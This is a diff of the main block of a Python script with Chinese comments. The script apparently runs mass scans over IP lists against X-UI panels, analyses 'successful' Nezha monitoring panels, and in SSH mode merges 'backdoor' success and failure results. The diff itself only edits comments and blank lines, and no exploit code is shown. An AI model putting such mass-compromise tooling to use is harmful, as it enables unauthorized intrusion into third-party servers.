@@ -2754,6 +2633,8 @@ if __name__ == "__main__":
         gen_func(**final_params)
         
         executable = compile_go_program()
+        
+        # ==================== 3. 执行扫描与分析 ====================
         generate_ipcx_py()
         split_file(input_file, lines_per_file)
         run_xui_for_parts(sleep_seconds, executable, total_ips, params['semaphore_size'])
@@ -2773,7 +2654,6 @@ if __name__ == "__main__":
                     unique_lines = sorted(list(set(f.readlines())))
                 with open(initial_results_file, 'w', encoding='utf-8') as f:
                     f.writelines(unique_lines)
-
                 print("--- 结果合并去重完成。 ---")
         
         final_txt_file = f"{prefix}-{time_str}.txt"
@@ -2783,7 +2663,6 @@ if __name__ == "__main__":
             os.rename("xui.txt", final_txt_file)
             run_ipcx(final_txt_file, final_xlsx_file)
 
-        # ==================== 在这里添加哪吒面板分析与Excel更新逻辑 ====================
         if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
             analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
             print(f"\n--- 开始对成功的哪吒面板进行深度分析（使用 {analysis_threads} 线程）... ---")
@@ -2807,11 +2686,9 @@ if __name__ == "__main__":
                         print(f'{result_line} 生成了一个异常: {exc}')
                         nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")
 
-            # 将分析结果写入Excel
             if nezha_analysis_data:
                 update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
 
-        # 仅在SSH模式下合并后门结果
         if TEMPLATE_MODE == 6:
             merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
             merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
